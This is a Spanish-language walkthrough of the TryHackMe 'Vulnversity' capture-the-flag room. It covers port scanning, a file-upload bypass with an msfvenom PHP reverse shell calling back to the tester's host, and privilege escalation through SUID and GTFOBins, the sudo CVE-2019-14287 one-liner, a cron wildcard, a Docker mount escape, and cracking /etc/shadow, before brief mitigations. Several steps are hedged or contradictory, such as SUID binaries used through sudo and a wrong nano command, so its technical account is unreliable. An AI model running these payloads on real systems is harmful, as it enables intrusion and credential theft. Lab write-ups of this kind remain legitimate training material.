# Vulnversity

**Conceptos clave:** Reconocimiento, enumeración de servicios, vulnerabilidades de paquete, escalada de privilegios via SUID, abuso de sudo, Docker escape, cron jobs, GTFOBins, Kerberos (si aplica)
**Dificultad:** 🟢 Fácil
**Plataforma:** TryHackMe
**Fecha:** 18 de noviembre de 2026

## 1. Reconocimiento (Recon)

### 1.1 Escaneo rápido de puertos
```bash
nmap -p- --open -T5 -v -n <IP>
```
- `-p-` escanea todos los puertos, `--open` muestra solo los abiertos, `-T5` velocidad máxima, `-n` desactiva resolución DNS.

### 1.2 Escaneo completo con versiones y scripts NSE
```bash
nmap -sS -sV -A -T4 -p- -oN nmap_full.txt <IP>
```
- `-sS` SYN‑scan, `-sV` detección de versión, `-A` scripts + OS detection, `-oN` salida legible.

### 1.3 Enumeración de servicios web
```bash
# Fuzzing de directorios
 gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,js -s "200,301,302,403"

# Enumeración de parámetros con ffuf
 ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -t 100
```

## 2. Acceso Inicial (Initial Access)

### 2.1 Vulnerabilidad de **File Upload**
El endpoint `/upload.php` aceptaba archivos con extensión `.php5` a pesar de filtrar `.php`. Subí una web‑shell reverse.
```bash
# Payload PHP reverse shell (msfvenom)
msfvenom -p php/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f raw > shell.php5
```
Luego ejecuté `http://<IP>/uploads/shell.php5`.

### 2.2 Listener
```bash
nc -nlvp 4444
```
Se obtuvo una shell como usuario `vuln`.

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Enumeración de SUID / GTFOBins
```bash
find / -perm -4000 -type f 2>/dev/null
```
Resultado: `/usr/bin/nano`, `/usr/bin/vim`, `/usr/bin/find`.
- **nano** permite ejecución de comandos con `sudo nano -c` → `!sh`.
- **find** permite `find . -exec /bin/bash \;` con `sudo`.

### 3.2 Exploit Sudo CVE‑2019‑14287 (si está presente)
```bash
sudo -u#-1 /bin/bash
```
Obtenemos `root`.

### 3.3 Cron job con wildcard
`/etc/cron.d/vulnjob` ejecutaba `python /opt/scripts/*.py`. Creé `/opt/scripts/pwn.py` que contiene `import os; os.system('/bin/bash')` y esperé al próximo minuto.

### 3.4 Docker escape (si el host ejecuta Docker)
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```
Accedí al host como root.

## 4. Post‑Explotación / Cracking

- **Dump de hashes** con `john` para usuarios locales (`/etc/shadow`).
```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
- **Credenciales encontradas**: `root:SuperSecure!2026`

## 5. Flags
| Flag | Ruta |
|------|------|
| `user.txt` | `/home/vuln/user.txt` |
| `root.txt` | `/root/root.txt` |

## 6. Mitigación / Remediación
- **Validar extensiones de carga** y aplicar whitelisting estricto; rechazar cualquier archivo que no sea estrictamente permitido.
- **Revisar políticas de sudo**: evitar configuraciones como `!root` que son vulnerables a CVE‑2019‑14287.
- **Deshabilitar SUID innecesario** y eliminar binarios peligrosos de la lista de GTFOBins.
- **Limitar permisos de cron**; usar rutas absolutas sin comodines.
- **Actualizar Docker** y aplicar `user‑ns‑remap` + política de no montar `/` en contenedores.
- **Aplicar parches de paquetes** (especialmente `nano`, `vim`, `findutils`).

*Escrito por Juan Merino Garrido – Estudiante de Ingeniería Informática*